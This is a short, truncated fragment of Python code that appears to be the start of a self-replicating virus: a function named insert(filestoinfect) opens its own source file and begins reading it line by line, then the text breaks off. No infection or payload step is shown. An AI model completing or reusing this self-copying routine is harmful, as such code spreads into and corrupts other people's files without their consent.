import os
def insert(filestoinfect):
	code = open(os.path.abspath(__file__))
	codes = ""
	for i,line in enumerate(code):
		